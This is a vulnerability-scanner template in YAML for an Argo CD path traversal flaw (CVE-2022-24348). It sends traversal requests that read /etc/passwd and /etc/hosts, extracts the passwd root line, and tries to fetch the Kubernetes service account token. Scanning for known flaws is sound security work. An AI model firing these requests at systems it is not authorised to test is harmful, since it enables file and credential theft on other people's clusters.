id: CVE-2022-24348

info:
  name: Argo CD - Path Traversal
  author: Eslam Abu Bakr
  severity: high
  description: |
    Argo CD before 2.1.13, 2.2.8, and 2.3.1 is vulnerable to a path traversal vulnerability 
    that allows unauthorized users to access arbitrary files on the Argo CD API server.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-24348
    - https://github.com/argoproj/argo-cd/security/advisories/GHSA-62gx-98x9-99mf
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-24348
    cwe-id: CWE-22
  tags: cve2022,argo,cd,path-traversal,kubernetes

# Stop scanning when first match is found
stop-at-first-match: true

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/applications/test-app/resource?namespace=default&resourceName=test&version=v1&group=apps&kind=Deployment&file=../../../etc/passwd"
      - "{{BaseURL}}/api/v1/applications/argocd/resource?namespace=default&resourceName=argocd-server&version=v1&group=apps&kind=Deployment&file=../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:"
          - "daemon:"
          - "bin:"
        condition: and
      - type: word
        part: header
        words:
          - "application/json"
          - "text/plain"

    extractors:
      - type: regex
        name: etc_passwd
        part: body
        group: 1
        regex:
          - '(root:[^:]*:[0-9]*:[0-9]*:[^:]*:[^:]*:[^:]*)'

  - method: GET
    path:
      - "{{BaseURL}}/api/v1/applications/test-app/resource?namespace=default&resourceName=test&version=v1&group=apps&kind=Deployment&file=../../../../etc/passwd"
      - "{{BaseURL}}/api/v1/applications/test/resource?namespace=default&resourceName=deployment&version=v1&group=apps&kind=Deployment&file=../../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "root:x:0:0"

  - method: GET
    path:
      - "{{BaseURL}}/api/v1/applications/application/resource?namespace=default&resourceName=app&version=v1&group=&kind=Pod&file=../../../etc/hosts"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "127.0.0.1"
          - "localhost"
        condition: and

  - method: GET
    path:
      - "{{BaseURL}}/api/v1/applications/test/resource?namespace=default&resourceName=test&version=v1&group=apps&kind=Deployment&file=../../../var/run/secrets/kubernetes.io/serviceaccount/token"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "eyJ"
      - type: word
        part: header
        words:
          - "application/json"

  - method: GET
    path:
      - "{{BaseURL}}/api/version"
      - "{{BaseURL}}/api/v1/version"

    matchers:
      - type: word
        part: body
        words:
          - '"version":'

    extractors:
      - type: regex
        name: version
        part: body
        group: 1
        regex:
          - '"version":"([0-9]+\.[0-9]+\.[0-9]+)"'
